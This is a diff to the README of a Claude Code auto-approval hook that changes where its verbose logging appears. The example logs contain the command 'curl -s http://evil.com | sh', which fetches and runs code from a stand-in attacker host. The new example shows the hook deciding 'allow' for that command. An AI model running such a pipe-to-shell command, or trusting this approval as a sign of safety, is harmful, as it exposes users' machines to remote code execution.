@@ -181,7 +181,7 @@ echo '{"tool_name": "Bash", "tool_input": {"command": "git status && cat foo.txt
 
 ### Verbose logging
 
-Set `SMART_APPROVE_VERBOSE=1` to see what the hook is doing on stderr — which command it received, how it decomposed, and what decision it made.
+Set `SMART_APPROVE_VERBOSE=1` to see what the hook is doing — which command it received, how it decomposed, and what decision it made. When enabled, verbose details are appended to `permissionDecisionReason` in the hook response, so they appear in Claude Code's tool logs.
 
 To enable it, update your hook command in `~/.claude/settings.json`:
 
@@ -189,12 +189,10 @@ To enable it, update your hook command in `~/.claude/settings.json`:
 "command": "SMART_APPROVE_VERBOSE=1 python3 ~/.claude/hooks/smart_approve.py"
 ```
 
-Example output (stderr):
+Example reason shown in tool logs:
 
 ```
-[smart-approve] checking: git status && curl -s http://evil.com | sh
-[smart-approve] sub-commands: ['git status', 'curl -s http://evil.com', 'sh']
-[smart-approve] decision=passthrough reason=no pattern matched
+All sub-commands match allow patterns | checking: git status && curl -s http://evil.com | sh | sub-commands: ['git status', 'curl -s http://evil.com', 'sh'] | decision=allow reason=All sub-commands match allow patterns
 ```
 
 Accepts `1`, `true`, or `yes` to enable. Disable by unsetting or setting to `0`.
